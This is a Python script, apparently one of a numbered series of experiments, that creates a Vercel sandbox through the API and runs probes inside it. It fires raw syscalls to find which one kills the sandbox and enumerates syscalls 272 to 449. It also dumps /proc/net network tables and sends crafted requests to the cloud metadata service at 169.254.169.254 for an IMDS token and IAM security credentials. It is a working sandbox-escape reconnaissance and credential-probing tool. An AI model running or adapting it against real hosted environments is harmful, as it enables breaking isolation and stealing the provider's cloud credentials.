# -*- coding: utf-8 -*-
"""实验J287n: 单测S271确认kill点 + 跳过它枚举272+ + IMDS + /proc/net补漏"""
import json, time, urllib.request, urllib.error, sys, base64
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": True, "logs": True, "timeout": timeout}
    t0 = time.time()
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} wall={time.time()-t0:.1f}s ===", flush=True)
    out = ""
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                out += d.get("data", "")
            elif d.get("stream") == "command":
                print("EXIT:", json.dumps(d.get("command", {}))[:300], flush=True)
        except Exception:
            print("NONJSON:", line[:400], flush=True)
    return out

NAME = "expj287n"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
if c != 200:
    print("create fail", r[:300], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

# cmd1: 单测 S271 ppoll (0,0,0,0,0)
out = run_cmd(sid, r'''
import ctypes, time, os
libc = ctypes.CDLL(None, use_errno=True)
print("before ppoll", flush=True)
time.sleep(0.3)
libc.syscall(271, 0, 0, 0, 0, 0)
e = ctypes.get_errno()
print("after ppoll e=%d" % e, flush=True)
os._exit(0)
''', "PPOLL_ONLY", timeout=100)
print("PPOLL_ONLY out:", repr(out[:400]), flush=True)

# cmd2: 从 272 开始枚举, 每个前print+flush, 慢节奏
out = run_cmd(sid, r'''
import ctypes, time
libc = ctypes.CDLL(None, use_errno=True)
NS = {272:"unshare",273:"set_robust_list",274:"get_robust_list",275:"splice",
276:"tee",277:"sync_file_range",278:"vmsplice",279:"move_pages",280:"utimensat",
281:"epoll_pwait",282:"signalfd",283:"timerfd_create",284:"eventfd",
285:"fallocate",286:"timerfd_settime",287:"timerfd_gettime",288:"accept4",
289:"signalfd4",290:"eventfd2",291:"epoll_create1",292:"dup3",293:"pipe2",
294:"inotify_init1",295:"preadv",296:"pwritev",297:"rt_tgsigqueueinfo",
298:"perf_event_open",299:"recvmmsg",300:"fanotify_init",301:"fanotify_mark",
302:"prlimit64",303:"name_to_handle_at",304:"open_by_handle_at",
305:"clock_adjtime",306:"syncfs",307:"sendmmsg",308:"setns",309:"getcpu",
310:"process_vm_readv",311:"process_vm_writev",312:"kcmp",313:"finit_module",
314:"sched_setattr",315:"sched_getattr",316:"renameat2",317:"seccomp",
318:"getrandom",319:"memfd_create",320:"kexec_file_load",321:"bpf",
322:"execveat",323:"userfaultfd",324:"membarrier",325:"mlock2",
326:"copy_file_range",327:"preadv2",328:"pwritev2",329:"pkey_mprotect",
330:"pkey_alloc",331:"pkey_free",332:"statx",333:"io_pgetevents",334:"rseq",
424:"pidfd_send_signal",425:"io_uring_setup",426:"io_uring_enter",
427:"io_uring_register",428:"open_tree",429:"move_mount",430:"fsopen",
431:"fsconfig",432:"fsmount",433:"fspick",434:"pidfd_open",436:"close_range",
437:"openat2",438:"pidfd_getfd",439:"faccessat2",440:"process_madvise",
441:"epoll_pwait2",442:"mount_setattr",443:"quotactl_fd",
444:"landlock_create_ruleset",445:"landlock_add_rule",
446:"landlock_restrict_self",447:"memfd_secret",448:"process_mrelease",
449:"futex_waitv"}
print("START", flush=True)
for n in sorted(NS):
    print("P%d:%s" % (n, NS[n]), flush=True)
    try:
        libc.syscall(n, 0, 0, 0, 0, 0, 0)
        e = ctypes.get_errno()
        print("R%d:%s e=%d" % (n, NS[n], e), flush=True)
    except Exception as ex:
        print("R%d:%s EXC %s" % (n, NS[n], ex), flush=True)
    time.sleep(0.03)
print("ALLDONE", flush=True)
''', "ENUM272", timeout=280)
print("ENUM272 out len:", len(out or ""), flush=True)
print((out or "")[:6000], flush=True)

# cmd3: /proc/net 补漏
out = run_cmd(sid, r'''
import subprocess
def sh(cmd, t=6):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=t)
        return (r.stdout or b"").decode("latin1", "replace")
    except Exception as e:
        return "ERR %s" % e
print("--- tcp6 ---", flush=True)
print(sh("cat /proc/net/tcp6 | head -30"), flush=True)
print("--- udp ---", flush=True)
print(sh("cat /proc/net/udp | head -30"), flush=True)
print("--- udp6 ---", flush=True)
print(sh("cat /proc/net/udp6 | head -30"), flush=True)
print("--- fib_trie ---", flush=True)
print(sh("cat /proc/net/fib_trie | head -60"), flush=True)
print("--- neigh ---", flush=True)
print(sh("cat /proc/net/neigh | head -20"), flush=True)
print("--- nf_conntrack ---", flush=True)
print(sh("cat /proc/net/nf_conntrack 2>&1 | head -10"), flush=True)
print("--- if_inet6 ---", flush=True)
print(sh("cat /proc/net/if_inet6 2>&1"), flush=True)
print("DONE", flush=True)
''', "NET", timeout=100)
print("NET out len:", len(out or ""), flush=True)
print((out or "")[:5000], flush=True)

# cmd4: IMDS 矩阵 (PUT/POST token 首次测)
out = run_cmd(sid, r'''
import socket
def tcp_probe(host, port, payload, timeout=4):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((host, port))
        s.sendall(payload)
        try:
            d = s.recv(4096)
            return "SEND_OK RECV %dB: %r" % (len(d), d[:120])
        except Exception as e:
            return "SEND_OK RECV_ERR %s" % type(e).__name__
    except Exception as e:
        return "CONN_ERR %s" % type(e).__name__
    finally:
        s.close()
tests = [
    ("PUT token", b"PUT /latest/api/token HTTP/1.1\r\nHost: 169.254.169.254\r\nX-aws-ec2-metadata-token-ttl-seconds: 21600\r\nContent-Length: 0\r\n\r\n"),
    ("POST token", b"POST /latest/api/token HTTP/1.1\r\nHost: 169.254.169.254\r\nX-aws-ec2-metadata-token-ttl-seconds: 21600\r\nContent-Length: 0\r\n\r\n"),
    ("GET root", b"GET / HTTP/1.1\r\nHost: 169.254.169.254\r\nConnection: close\r\n\r\n"),
    ("GET creds", b"GET /latest/meta-data/iam/security-credentials/ HTTP/1.1\r\nHost: 169.254.169.254\r\nConnection: close\r\n\r\n"),
]
for name, payload in tests:
    print("IMDS %s: %s" % (name, tcp_probe("169.254.169.254", 80, payload)), flush=True)
print("DONE", flush=True)
''', "IMDS", timeout=100)
print("IMDS out:", repr((out or "")[:1200]), flush=True)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
